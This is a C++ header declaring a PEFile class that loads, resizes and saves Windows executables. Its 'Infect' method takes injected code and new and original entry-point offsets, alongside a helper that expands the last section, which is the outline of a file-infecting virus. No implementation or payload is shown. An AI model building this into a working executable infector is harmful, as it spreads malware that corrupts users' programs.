#ifndef PE_FILE_H
#define PE_FILE_H

#include <Windows.h>
#include <string>

class PEFile
{
public:
	PEFile(char const* filePath);
	PEFile(PEFile& rhs) = delete;
	~PEFile(void);

	PEFile& operator=(PEFile const& rhs) = delete;

	void Save(void) const;
	void SaveAs(char const* filePath) const;

	void Infect(char const* code, size_t size, DWORD newEntryPointOffset, DWORD originalEntryPointOffset); 


	size_t GetFileSize(void) const;
	size_t GetNumberOfSections(void) const;


private:
	static size_t AlignSize(size_t size, size_t alingment);
	void LoadFile(void);
	void ReallocateBuffer(size_t size);
	void UpdateHeaderPointers(void);
	void ExpandLastSection(size_t size);
	//void AppendLastSection(char const* data, size_t size);


	std::string				m_filePath;
	char*					m_fileBuffer;
	size_t					m_fileSize;
	size_t					m_bufferSize;

	IMAGE_DOS_HEADER*		m_dosHeader;
	IMAGE_NT_HEADERS*		m_ntHeaders;
	IMAGE_SECTION_HEADER*	m_firstSectionHeader;
};


#endif